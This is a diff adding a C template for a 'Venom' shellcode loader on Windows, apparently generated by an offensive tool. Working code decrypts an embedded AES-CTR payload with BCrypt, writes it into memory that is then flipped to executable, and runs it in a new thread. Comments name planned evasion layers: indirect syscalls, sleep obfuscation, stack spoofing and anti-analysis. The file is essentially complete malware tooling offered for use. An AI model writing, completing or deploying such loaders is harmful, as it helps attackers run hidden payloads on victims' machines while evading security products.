@@ -1,0 +1,123 @@
+/* Venom loader — generated artifact
+ * seed: {{recipe_seed}}
+ * payload sha256 prefix: {{payload_sha}}
+ *
+ * Encryption: AES-256-CTR via BCrypt CNG (Windows native, no third-party crypto)
+ * Memory:     RW alloc -> write -> flip to RX
+ * Exec:       CreateThread -> WaitForSingleObject
+ *
+ * This is Phase 1 MVP. Layers (indirect syscalls, sleep obfuscation,
+ * stack spoofing, anti-analysis) plug in at later phases.
+ */
+
+#include <windows.h>
+#include <bcrypt.h>
+#include <stdint.h>
+
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(s) ((s) >= 0)
+#endif
+
+#pragma comment(lib, "bcrypt.lib")
+
+static unsigned char {{shellcode_var}}[] = {
+{{shellcode_bytes}}
+};
+static const SIZE_T {{size_var}} = {{shellcode_len}};
+
+static unsigned char {{key_var}}[32] = {
+{{key_bytes}}
+};
+
+static unsigned char {{iv_var}}[16] = {
+{{iv_bytes}}
+};
+
+
+static int {{decrypt_fn}}(unsigned char *data, SIZE_T data_len,
+                          const unsigned char *key, const unsigned char *iv) {
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_KEY_HANDLE hKey = NULL;
+    NTSTATUS st;
+    int rc = -1;
+
+    st = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
+    if (!NT_SUCCESS(st)) goto cleanup;
+
+    st = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
+                           (PUCHAR)BCRYPT_CHAIN_MODE_ECB,
+                           sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
+    if (!NT_SUCCESS(st)) goto cleanup;
+
+    st = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
+                                    (PUCHAR)key, 32, 0);
+    if (!NT_SUCCESS(st)) goto cleanup;
+
+    unsigned char counter[16];
+    unsigned char keystream[16];
+    ULONG out_len = 0;
+
+    for (SIZE_T i = 0; i < 16; i++) counter[i] = iv[i];
+
+    for (SIZE_T off = 0; off < data_len; off += 16) {
+        st = BCryptEncrypt(hKey, counter, 16, NULL, NULL, 0,
+                           keystream, 16, &out_len, 0);
+        if (!NT_SUCCESS(st)) goto cleanup;
+
+        SIZE_T blk = (data_len - off) >= 16 ? 16 : (data_len - off);
+        for (SIZE_T j = 0; j < blk; j++) {
+            data[off + j] ^= keystream[j];
+        }
+        /* increment 128-bit counter, big-endian last 4 bytes (matches CTR spec) */
+        for (int k = 15; k >= 0; k--) {
+            counter[k]++;
+            if (counter[k] != 0) break;
+        }
+    }
+    rc = 0;
+
+cleanup:
+    if (hKey) BCryptDestroyKey(hKey);
+    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    return rc;
+}
+
+
+static int {{exec_fn}}(unsigned char *plaintext, SIZE_T plaintext_len) {
+    LPVOID mem = VirtualAlloc(NULL, plaintext_len,
+                              MEM_COMMIT | MEM_RESERVE,
+                              PAGE_READWRITE);
+    if (!mem) return 1;
+
+    for (SIZE_T i = 0; i < plaintext_len; i++) {
+        ((unsigned char *)mem)[i] = plaintext[i];
+    }
+
+    DWORD old_protect = 0;
+    if (!VirtualProtect(mem, plaintext_len, PAGE_EXECUTE_READ, &old_protect)) {
+        VirtualFree(mem, 0, MEM_RELEASE);
+        return 2;
+    }
+
+    HANDLE th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem,
+                             NULL, 0, NULL);
+    if (!th) {
+        VirtualFree(mem, 0, MEM_RELEASE);
+        return 3;
+    }
+
+    WaitForSingleObject(th, INFINITE);
+    CloseHandle(th);
+    return 0;
+}
+
+
+int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nCmd) {
+    (void)hInst; (void)hPrev; (void)lpCmd; (void)nCmd;
+
+    if ({{decrypt_fn}}({{shellcode_var}}, {{size_var}},
+                       {{key_var}}, {{iv_var}}) != 0) {
+        return 1;
+    }
+    return {{exec_fn}}({{shellcode_var}}, {{size_var}});
+}
